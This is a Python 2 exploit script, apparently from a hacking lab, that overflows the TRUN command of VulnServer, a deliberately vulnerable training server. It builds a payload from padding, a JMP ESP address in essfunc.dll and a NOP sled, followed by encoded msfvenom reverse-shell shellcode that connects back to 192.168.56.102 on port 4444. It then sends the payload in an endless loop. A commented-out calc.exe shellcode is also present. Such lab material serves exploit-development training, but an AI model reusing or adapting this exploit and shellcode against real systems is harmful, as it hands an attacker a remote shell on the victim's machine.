#!/usr/bin/env python
#VulnServer Trun Exploit
#Author: HackerOnTwoWheels

import socket
import struct

#Target
host="192.168.56.101"
port=9999

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect((host,port))
	print "\n[*] Successfully connected to VulnServer at: " + host + " [*]"
except:
	print "\n[!]Vulnserver cannot be reached at: " + host + " [!]"
	print "\n[!]Please check if vulnserver is running on target host [!]"

#Payload

buffsize = 5011
header = "TRUN /.../"
padding = "A"*2002

#eip jmp esp - generated with !mona jmp -r esp
#0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll]- (C:\Documents and Settings\exploits\Desktop\Exploitable Softwares\vulnserver\essfunc.dll)
eip = struct.pack("<L", 0x625011af)
nops = "\x90"*20





#shell code to open calc.exe as PoC
#buf = "\x31\xC9"                  # xor ecx,ecx
#buf += "\x51"                     # push ecx
#buf += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
#buf += "\x54"                     # push dword ptr esp
#buf += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
#buf += "\xFF\xD0"                 # call eax


#msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f python

buf =  ""
buf += "\xd9\xd0\xd9\x74\x24\xf4\x5a\xb8\x65\x41\x2c\xa1\x2b"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\x27\x52\xce"
buf += "\x54\x5b\xbc\x8c\x97\xa3\x3d\xf1\x1e\x46\x0c\x31\x44"
buf += "\x03\x3f\x81\x0e\x41\xcc\x6a\x42\x71\x47\x1e\x4b\x76"
buf += "\xe0\x95\xad\xb9\xf1\x86\x8e\xd8\x71\xd5\xc2\x3a\x4b"
buf += "\x16\x17\x3b\x8c\x4b\xda\x69\x45\x07\x49\x9d\xe2\x5d"
buf += "\x52\x16\xb8\x70\xd2\xcb\x09\x72\xf3\x5a\x01\x2d\xd3"
buf += "\x5d\xc6\x45\x5a\x45\x0b\x63\x14\xfe\xff\x1f\xa7\xd6"
buf += "\x31\xdf\x04\x17\xfe\x12\x54\x50\x39\xcd\x23\xa8\x39"
buf += "\x70\x34\x6f\x43\xae\xb1\x6b\xe3\x25\x61\x57\x15\xe9"
buf += "\xf4\x1c\x19\x46\x72\x7a\x3e\x59\x57\xf1\x3a\xd2\x56"
buf += "\xd5\xca\xa0\x7c\xf1\x97\x73\x1c\xa0\x7d\xd5\x21\xb2"
buf += "\xdd\x8a\x87\xb9\xf0\xdf\xb5\xe0\x9c\x2c\xf4\x1a\x5d"
buf += "\x3b\x8f\x69\x6f\xe4\x3b\xe5\xc3\x6d\xe2\xf2\x24\x44"
buf += "\x52\x6c\xdb\x67\xa3\xa5\x18\x33\xf3\xdd\x89\x3c\x98"
buf += "\x1d\x35\xe9\x0f\x4d\x99\x42\xf0\x3d\x59\x33\x98\x57"
buf += "\x56\x6c\xb8\x58\xbc\x05\x53\xa3\x57\xea\x0c\x93\xc1"
buf += "\x82\x4e\xe3\x1c\x0f\xc6\x05\x74\xbf\x8e\x9e\xe1\x26"
buf += "\x8b\x54\x93\xa7\x01\x11\x93\x2c\xa6\xe6\x5a\xc5\xc3"
buf += "\xf4\x0b\x25\x9e\xa6\x9a\x3a\x34\xce\x41\xa8\xd3\x0e"
buf += "\x0f\xd1\x4b\x59\x58\x27\x82\x0f\x74\x1e\x3c\x2d\x85"
buf += "\xc6\x07\xf5\x52\x3b\x89\xf4\x17\x07\xad\xe6\xe1\x88"
buf += "\xe9\x52\xbe\xde\xa7\x0c\x78\x89\x09\xe6\xd2\x66\xc0"
buf += "\x6e\xa2\x44\xd3\xe8\xab\x80\xa5\x14\x1d\x7d\xf0\x2b"
buf += "\x92\xe9\xf4\x54\xce\x89\xfb\x8f\x4a\xb9\xb1\x8d\xfb"
buf += "\x52\x1c\x44\xbe\x3e\x9f\xb3\xfd\x46\x1c\x31\x7e\xbd"
buf += "\x3c\x30\x7b\xf9\xfa\xa9\xf1\x92\x6e\xcd\xa6\x93\xba"


payload = header + padding + eip + nops + buf
payload += "C" * (buffsize - len(payload))

#Send Payload and Exploit
count = 0
print "\n[*] Sending Payload to target [*]"
while True:
	count += 1
	s.send(payload)
	print "\n[*] Sent: " + str(len(payload)) + " bytes " + str(count) + " times[*]\n"
	#print "\n[!] If you do not receive shell, trying sending exploit multiple times!!! [!]\n"
s.close()

